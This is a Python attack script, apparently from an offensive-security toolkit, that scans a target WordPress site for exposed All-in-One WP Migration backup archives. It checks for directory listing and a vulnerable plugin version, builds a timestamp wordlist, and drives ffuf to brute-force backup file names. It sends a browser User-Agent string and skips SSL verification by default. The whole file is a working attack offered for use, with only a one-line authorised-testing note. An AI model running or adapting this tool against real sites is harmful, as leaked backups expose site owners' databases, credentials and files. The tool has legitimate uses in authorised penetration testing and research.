#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
All-in-One WP Migration Backup Finder (ffuf version)

Based on research by @vavkamil - https://vavkamil.cz/2020/03/25/all-in-one-wp-migration/
Script by @random_robbie

This tool attempts to discover exposed WordPress backup files from the
All-in-One WP Migration plugin by brute-forcing timestamp-based filenames.
"""

import sys
import argparse
import subprocess
import logging
import json
from pathlib import Path
from typing import Optional

from wp_migration_common import WPMigrationScanner, validate_tool_installed

logger = logging.getLogger(__name__)


def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Find exposed All-in-One WP Migration backup files using ffuf",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -u https://example.com -d 20 -v
  %(prog)s -u https://example.com --verify-ssl -o results.json -t 50

Note: This tool requires ffuf to be installed and available in PATH.
For authorized security testing only.
        """
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target WordPress URL"
    )

    parser.add_argument(
        "-d", "--delta",
        type=int,
        default=10,
        help="Minutes to check before/after identified timestamp (default: 10)"
    )

    parser.add_argument(
        "-o", "--output",
        default="ffuf.json",
        help="Output file for ffuf results (default: ffuf.json)"
    )

    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=30,
        help="Number of concurrent threads for ffuf (default: 30)"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    parser.add_argument(
        "--verify-ssl",
        action="store_true",
        help="Verify SSL certificates (default: disabled)"
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)"
    )

    parser.add_argument(
        "--skip-checks",
        action="store_true",
        help="Skip preliminary checks (version, directory listing, etc.)"
    )

    parser.add_argument(
        "--payload-file",
        default="timerange.txt",
        help="Payload file name (default: timerange.txt)"
    )

    parser.add_argument(
        "--rate-limit",
        type=int,
        help="Rate limit (requests per second)"
    )

    return parser.parse_args()


def run_ffuf(url: str, wordlist: str, output_file: str = "ffuf.json",
             threads: int = 30, rate_limit: Optional[int] = None) -> bool:
    """
    Run ffuf to brute-force backup files.

    Args:
        url: Target URL with FUZZ placeholder
        wordlist: Path to wordlist file
        output_file: Output file for results
        threads: Number of concurrent threads
        rate_limit: Optional rate limit (requests per second)

    Returns:
        True if ffuf ran successfully
    """
    if not validate_tool_installed("ffuf"):
        logger.error("ffuf is not installed or not in PATH")
        logger.error("Install from: https://github.com/ffuf/ffuf")
        return False

    # Build ffuf command with proper argument passing
    cmd = [
        "ffuf",
        "-w", wordlist,  # Wordlist
        "-u", url,  # Target URL
        "-X", "HEAD",  # Use HEAD requests
        "-c",  # Colorize output
        "-mc", "200,300,303",  # Match these status codes
        "-o", output_file,  # Output file
        "-of", "json",  # Output format
        "-t", str(threads),  # Threads
        "-H", f"User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
    ]

    if rate_limit:
        cmd.extend(["-rate", str(rate_limit)])

    logger.info("=" * 60)
    logger.info("Starting ffuf scan...")
    logger.info("=" * 60)
    logger.info(f"Target: {url}")
    logger.info(f"Wordlist: {wordlist}")
    logger.info(f"Threads: {threads}")
    if rate_limit:
        logger.info(f"Rate limit: {rate_limit} req/s")
    logger.info(f"Output: {output_file}")
    logger.info("=" * 60)
    logger.warning("Press Ctrl+C to stop the scan")
    logger.info("=" * 60)

    try:
        # Use subprocess.run for safe command execution
        result = subprocess.run(
            cmd,
            check=False,  # Don't raise exception on non-zero exit
            text=True
        )

        if result.returncode == 0:
            logger.info("Scan completed successfully")

            # Try to parse and display results
            try:
                with open(output_file, 'r') as f:
                    data = json.load(f)
                    results = data.get('results', [])
                    if results:
                        logger.info("=" * 60)
                        logger.info(f"FOUND {len(results)} POTENTIAL BACKUP(S)!")
                        logger.info("=" * 60)
                        for result in results:
                            logger.warning(f"  - {result.get('url', 'N/A')} [{result.get('status', 'N/A')}]")
                        logger.info("=" * 60)
            except (FileNotFoundError, json.JSONDecodeError) as e:
                logger.debug(f"Could not parse results: {e}")

            return True
        else:
            logger.warning(f"ffuf exited with code {result.returncode}")
            return False

    except KeyboardInterrupt:
        logger.info("\nScan interrupted by user")
        return False
    except subprocess.SubprocessError as e:
        logger.error(f"Error running ffuf: {e}")
        return False


def main() -> int:
    """Main execution function."""
    args = parse_arguments()

    # Initialize scanner
    try:
        scanner = WPMigrationScanner(
            url=args.url,
            verify_ssl=args.verify_ssl,
            timeout=args.timeout,
            verbose=args.verbose
        )
    except ValueError as e:
        logger.error(f"Invalid URL: {e}")
        return 1

    logger.info("=" * 60)
    logger.info("All-in-One WP Migration Backup Finder")
    logger.info("ffuf version")
    logger.info("=" * 60)
    logger.info(f"Target: {scanner.url}")
    logger.info("=" * 60)

    # Check if server is reachable
    if not scanner.check_server_status():
        logger.error("Cannot proceed: server is not reachable")
        return 1

    if not args.skip_checks:
        # Check for directory listing
        exposed_dir = scanner.check_directory_listing()
        if exposed_dir:
            logger.warning("=" * 60)
            logger.warning("DIRECTORY LISTING ENABLED!")
            logger.warning("=" * 60)
            logger.warning("No brute-forcing needed!")
            logger.warning(f"Browse to: {exposed_dir}")
            logger.warning("=" * 60)
            return 0

        # Check for multiple backups
        backups = scanner.check_multipart_response()
        if backups:
            logger.warning("=" * 60)
            logger.warning("MULTIPLE BACKUPS FOUND!")
            logger.warning("=" * 60)
            for backup_url in backups:
                logger.warning(f"  - {backup_url}")
            logger.warning("=" * 60)
            return 0

        # Check Wayback Machine
        wayback_urls = scanner.check_wayback_machine()
        if wayback_urls:
            logger.info("=" * 60)
            logger.info("Wayback Machine URLs found:")
            logger.info("=" * 60)
            for wb_url in wayback_urls:
                logger.info(f"  - {wb_url}")
            logger.info("=" * 60)

        # Check plugin version
        if not scanner.check_version():
            logger.warning("=" * 60)
            logger.warning("Plugin version does not appear to be vulnerable")
            logger.warning("Continuing anyway...")
            logger.warning("=" * 60)

    # Get backup timestamp
    timestamp = scanner.get_backup_timestamp()
    if not timestamp:
        logger.error("Could not determine backup timestamp")
        logger.error("Cannot generate brute-force payload")
        return 1

    # Generate payload
    try:
        payload_file, count = scanner.generate_payload(
            timestamp=timestamp,
            delta_minutes=args.delta,
            output_file=args.payload_file
        )
        logger.info(f"Generated {count:,} payload entries")
    except Exception as e:
        logger.error(f"Error generating payload: {e}")
        return 1

    # Get final domain after redirects
    domain = scanner.get_domain()
    time_ymd = timestamp.strftime("%Y%m%d")

    # Construct target URL
    target_url = f"{scanner.url}/wp-content/ai1wm-backups/{domain}-{time_ymd}-FUZZ.wpress"

    # Run ffuf
    success = run_ffuf(
        url=target_url,
        wordlist=payload_file,
        output_file=args.output,
        threads=args.threads,
        rate_limit=args.rate_limit
    )

    if success:
        logger.info("=" * 60)
        logger.info("Scan completed")
        logger.info("=" * 60)
        logger.info(f"Results saved to: {args.output}")
        logger.info("=" * 60)
        return 0
    else:
        return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)
